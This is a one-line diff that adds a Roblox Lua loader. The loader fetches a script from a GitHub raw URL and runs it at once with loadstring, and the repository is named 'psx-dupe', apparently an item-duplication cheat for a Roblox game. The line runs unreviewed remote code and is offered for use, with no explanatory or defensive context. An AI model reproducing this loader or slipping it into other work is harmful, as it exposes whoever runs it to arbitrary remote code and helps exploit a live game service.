@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/NuggetGamingYT/psx-dupe/main/script.lua'))()
